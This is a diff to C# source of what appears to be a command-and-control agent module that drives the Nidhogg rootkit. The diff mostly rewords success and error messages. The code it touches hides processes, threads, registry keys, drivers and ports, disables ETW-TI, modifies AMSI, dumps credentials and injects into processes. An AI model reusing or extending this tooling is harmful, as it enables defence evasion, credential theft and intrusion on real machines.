@@ -166,7 +166,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to protect file: {err}", task_id, true, "error");
                     return;
                 }
-
+                sb.AppendLine("[+] File protected successfully.");
             }
             else
             {
@@ -177,6 +177,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unprotect file: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] File unprotected successfully.");
             }
 
             sb.AppendLine("[+] Files after protect:");
@@ -204,6 +205,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to protect process: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Process protected successfully.");
 
             }
             else
@@ -215,6 +217,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unprotect process: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Process unprotected successfully.");
             }
 
             sb.AppendLine("[+] Protected Processes:");
@@ -242,6 +245,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to hide process: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Process hidden successfully.");
 
             }
             else
@@ -253,6 +257,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unhide process: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Process unhidden successfully.");
             }
 
             sb.AppendLine("Successfully modified visibility of process: " + args.id);
@@ -272,7 +277,7 @@ namespace Agent
                 return;
             }
 
-            sb.AppendLine("Successfully modified elevation of process: " + args.id);
+            sb.AppendLine("Successfully elevated process: " + args.id);
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task ModifyThreadVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
@@ -285,9 +290,10 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to hide process: {err}", task_id, true, "error");
+                    await this.messageManager.WriteLine($"Failed to hide thread: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully hid thread: " + args.id);
             }
             else
             {
@@ -295,11 +301,11 @@ namespace Agent
 
                 if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
                 {
-                    await this.messageManager.WriteLine($"Failed to unhide process: {err}", task_id, true, "error");
+                    await this.messageManager.WriteLine($"Failed to unhide thread: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unhid thread: " + args.id);
             }
-            sb.AppendLine("Successfully modified visibility of thread: " + args.id);
             await this.messageManager.WriteLine(sb.ToString(), task_id, true); ;
         }
         private async Task ModifyThreadProtection(NidhoggApi api, NidhoggArgs args, string task_id, bool protect)
@@ -315,7 +321,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to protect thread: {err}", task_id, true, "error");
                     return;
                 }
-
+                sb.AppendLine("[+] Succesfully protected thread: " + args.id);
             }
             else
             {
@@ -326,6 +332,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unprotect thread: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unprotected thread: " + args.id);
             }
 
             sb.AppendLine("[+] Protected Threads");
@@ -353,6 +360,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to protect key: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully protected key: " + args.path);
             }
             else
             {
@@ -363,10 +371,10 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unprotect key: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unprotected key: " + args.path);
             }
+
             sb.AppendLine("[+] Protected registry keys");
-
-
             foreach (var val in api.QueryProtectedRegistryKeys() ?? new string[0])
             {
                 sb.AppendLine("\t" + val);
@@ -386,6 +394,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully hid Key: " + args.path);
             }
             else
             {
@@ -396,7 +405,9 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to hide key: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unhid Key: " + args.path);
             }
+
             sb.AppendLine("[+] Hidden registry keys");
 
             foreach (var val in api.QueryHiddenRegistryKeys() ?? new string[0])
@@ -418,6 +429,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to protect value: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully protected value: " + args.value + " at: " + args.path);
             }
             else
             {
@@ -428,7 +440,9 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unprotect value: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unprotected value: " + args.value + " at: " + args.path);
             }
+
             sb.AppendLine("[+] Protected registry values");
 
             foreach (var val in api.QueryProtectedRegistryValues() ?? new Dictionary<string, string>())
@@ -450,6 +464,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to hide value: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully hid value: " + args.value + " at: " + args.path);
             }
             else
             {
@@ -460,7 +475,9 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unhide value: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unhid value: " + args.value + " at: " + args.path);
             }
+
             sb.AppendLine("[+] Hidden registry values");
 
             foreach (var val in api.QueryHiddenRegistryValues() ?? new Dictionary<string, string>())
@@ -479,7 +496,6 @@ namespace Agent
                 await this.messageManager.WriteLine($"Failed to disable etwti: {err}", task_id, true, "error");
                 return;
             }
-
 
             sb.AppendLine(enable ? "[+] Etwti enabled" : "[+] Etwti disabled");
 
@@ -510,6 +526,8 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
                     return;
                 }
+
+                sb.AppendLine("[+] Succesfully hid driver: " + args.path);
             }
             else
             {
@@ -520,8 +538,10 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
                     return;
                 }
+
+                sb.AppendLine("[+] Succesfully unhid driver: " + args.path);
             }
-            sb.AppendLine("Success");
+ 
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggModifyAmsi(NidhoggApi api, NidhoggArgs args, string task_id)
@@ -547,11 +567,11 @@ namespace Agent
 
             if (!err.Equals(NidhoggApi.NidhoggErrorCodes.NIDHOGG_SUCCESS))
             {
-                await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
+                await this.messageManager.WriteLine($"Failed to modify module: {err}", task_id, true, "error");
                 return;
             }
 
-            sb.AppendLine("Success");
+            sb.AppendLine("Succesfully modified module");
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggModifyPortVisibility(NidhoggApi api, NidhoggArgs args, string task_id, bool hide)
@@ -567,6 +587,7 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to hide driver: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully hid port: " + args.id);
             }
             else
             {
@@ -577,13 +598,16 @@ namespace Agent
                     await this.messageManager.WriteLine($"Failed to unhide unhide: {err}", task_id, true, "error");
                     return;
                 }
+                sb.AppendLine("[+] Succesfully unhid port: " + args.id);
             }
-            sb.AppendLine("Success");
+
+            sb.AppendLine("[+] Hidden Ports: ");
             foreach (var port in api.QueryHiddenPorts() ?? new HiddenPort[0])
             {
                 
                 sb.AppendLine($"\tPort: {port.Port}\t Remote:{port.Remote}\t Tcp: {port.Type}");
             }
+
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
         private async Task NidhoggDumpCredentials(NidhoggApi api, string task_id)
@@ -640,7 +664,7 @@ namespace Agent
                 return;
             }
 
-            sb.AppendLine("Success.");
+            sb.AppendLine($"Succesfully injected {args.path} into {args.id}.");
             await this.messageManager.WriteLine(sb.ToString(), task_id, true);
         }
     }
